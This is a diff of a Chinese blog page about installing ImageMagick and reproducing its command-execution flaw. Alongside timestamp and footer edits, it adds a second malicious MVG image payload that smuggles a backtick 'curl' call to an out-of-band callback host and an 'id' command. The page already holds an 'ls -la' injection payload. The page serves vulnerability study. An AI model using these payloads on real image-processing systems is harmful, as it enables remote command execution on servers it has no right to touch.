@@ -125,7 +125,7 @@
 <meta property="og:site_name" content="Orleven Blog">
 <meta property="og:description" content="概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2017-10-13T01:09:23.788Z">
+<meta property="og:updated_time" content="2019-01-13T16:08:08.254Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux 安装 ImageMagick 以及命令执行漏洞复现">
 <meta name="twitter:description" content="概述最近刚出了ImageMagick命令执行漏洞，于是复现了一波，结果安装过程遇到了不少麻烦，特地记录下。">
@@ -483,6 +483,7 @@
 </ul>
 <p>payload :</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://example.com/image.jpg&quot;|ls &quot;-la)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">push graphic-context</div><div class="line">viewbox 0 0 640 480</div><div class="line">fill &apos;url(https://127.0.0.1/image.jpg?`curl emwv9i.ceye.io`&quot;||id &quot;)&apos;</div><div class="line">pop graphic-context</div></pre></td></tr></table></figure>
 <p>将以上内容保存为test.png图片，执行convert test.png 1.png，就会执行命令。</p>
 
       
@@ -609,7 +610,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives/ || archive">
-                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-count">33</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
@@ -630,7 +631,7 @@
             
             
             <div class="site-state-item site-state-tags">
-              <a href="/tags/index-1.html">
+              <a href="/tags/index.html">
                 <span class="site-state-item-count">66</span>
                 <span class="site-state-item-name">标签</span>
               </a>
@@ -705,7 +706,7 @@
 
     <footer id="footer" class="footer">
       <div class="footer-inner">
-        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2018</span>
+        <div class="copyright">&copy; 2016 &mdash; <span itemprop="copyrightYear">2019</span>
   <span class="with-love">
     <i class="fa fa-user"></i>
   </span>
